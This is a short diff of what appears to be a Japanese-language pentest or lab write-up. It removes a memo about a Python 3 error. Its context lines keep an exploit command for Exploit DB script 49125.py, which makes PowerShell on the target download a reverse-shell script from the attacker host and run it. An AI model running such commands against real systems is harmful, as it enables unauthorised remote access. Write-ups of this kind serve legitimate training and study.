@@ -94,9 +94,6 @@ cd /tmp
 python3 49125.py $rhost [RPORT] "C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c wget 'http://${lhost}/mini-reverse.ps1' -outfile 'C:\Users\Bill\Desktop\mini-reverse.ps1'; C:\Users\Bill\Desktop\mini-reverse.ps1" 
 ```
 
-## Memo
-*1 python3で実行した場合、エラーが発生する。
-
 ## Reference
 
 Exploit DB  
